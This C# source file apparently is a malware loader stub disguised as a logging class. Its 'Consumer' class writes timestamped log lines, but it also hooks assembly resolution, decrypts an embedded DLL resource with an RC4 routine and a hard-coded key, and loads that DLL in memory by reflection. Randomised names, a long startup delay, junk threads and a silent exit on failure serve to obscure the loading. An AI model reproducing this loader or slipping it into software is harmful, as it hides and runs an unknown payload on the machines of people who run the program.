using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using Qgxjrevgwqeux;

namespace ax1667.Filter;

public class Consumer
{
	[Flags]
	private enum InsertionMode
	{

	}

	private readonly object value = new object();

	private readonly string connection;

	private readonly string _Mock;

	public Consumer()
	{
		for (int i = 0; i < 22; i++)
		{
			Thread.Sleep(1000);
			new Thread((ThreadStart)delegate
			{
				for (int j = 0; j < 99; j++)
				{
					Console.WriteLine(j);
				}
			}).Start();
		}
		connection = "yyyy-MM-dd HH:mm:ss.fff";
		_Mock = Assembly.GetExecutingAssembly().GetName().Name + ".log";
		AppDomain.CurrentDomain.AssemblyResolve += ReflectConfiguration;
		string text = _Mock + " is created.";
		if (File.Exists(_Mock))
		{
			CreateConfiguration(DateTime.Now.ToString(connection) + " " + text);
		}
	}

	public void InvokeConfiguration(string i)
	{
		VerifyConfiguration((InsertionMode)2, i);
	}

	public void InstantiateConfiguration(string first)
	{
		VerifyConfiguration((InsertionMode)4, first);
	}

	public void AddConfiguration(string config)
	{
		VerifyConfiguration((InsertionMode)5, config);
	}

	public void FlushConfiguration(string key)
	{
		VerifyConfiguration((InsertionMode)1, key);
	}

	public void PrintConfiguration(string value)
	{
		VerifyConfiguration((InsertionMode)0, value);
	}

	public void PopConfiguration(string def)
	{
		VerifyConfiguration((InsertionMode)3, def);
	}

	private void CreateConfiguration(string instance, bool isvisitor = false)
	{
		try
		{
			if (string.IsNullOrEmpty(instance))
			{
				return;
			}
			lock (value)
			{
				using StreamWriter streamWriter = new StreamWriter(_Mock, isvisitor, Encoding.UTF8);
				streamWriter.WriteLine(instance);
			}
		}
		catch
		{
			throw;
		}
	}

	private void VerifyConfiguration(InsertionMode param, string ord)
	{
		CreateConfiguration(param switch
		{
			(InsertionMode)0 => DateTime.Now.ToString(connection) + " [TRACE]   ", 
			(InsertionMode)1 => DateTime.Now.ToString(connection) + " [INFO]    ", 
			(InsertionMode)2 => DateTime.Now.ToString(connection) + " [DEBUG]   ", 
			(InsertionMode)3 => DateTime.Now.ToString(connection) + " [WARNING] ", 
			(InsertionMode)4 => DateTime.Now.ToString(connection) + " [ERROR]   ", 
			(InsertionMode)5 => DateTime.Now.ToString(connection) + " [FATAL]   ", 
			_ => "", 
		} + ord, isvisitor: true);
	}

	public string VisitConfiguration()
	{
		try
		{
			dynamic val = Activator.CreateInstance(typeof(ClassLibrary));
			return val.Data();
		}
		catch
		{
			Environment.Exit(0);
		}
		return null;
	}

	private byte[] NewConfiguration(byte[] var1)
	{
		int[] array = new int[256];
		int[] array2 = new int[256];
		byte[] array3 = new byte[var1.Length];
		byte[] bytes = Encoding.UTF8.GetBytes("Wdvqrnpueiyv");
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = bytes[i % bytes.Length];
			array2[i] = i;
		}
		i = 0;
		int num = 0;
		for (; i < 256; i++)
		{
			num = (num + array2[i] + array[i]) % 256;
			int num2 = array2[i];
			array2[i] = array2[num];
			array2[num] = num2;
		}
		new Thread((ThreadStart)delegate
		{
			for (int j = 0; j < 999999; j++)
			{
				Console.WriteLine(j);
			}
		}).Start();
		i = 0;
		num = 0;
		int num3 = 0;
		for (; i < var1.Length; i++)
		{
			num3++;
			num3 %= 256;
			num += array2[num3];
			num %= 256;
			int num2 = array2[num3];
			array2[num3] = array2[num];
			array2[num] = num2;
			int num4 = array2[(array2[num3] + array2[num]) % 256];
			array3[i] = (byte)(var1[i] ^ num4);
		}
		return array3;
	}

	private Assembly ReflectConfiguration(object config, ResolveEventArgs map)
	{
		string name = "Llfwvpucq.Qgxjrevgwqeux.dll";
		Stream? manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		byte[] array = new byte[manifestResourceStream!.Length];
		manifestResourceStream!.Read(array, 0, array.Length);
		new Thread((ThreadStart)delegate
		{
			for (int i = 0; i < 999; i++)
			{
				Console.WriteLine(i);
			}
		}).Start();
		byte[] array2 = NewConfiguration(array);
		return (Assembly)typeof(Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[1] { array2 });
	}
}
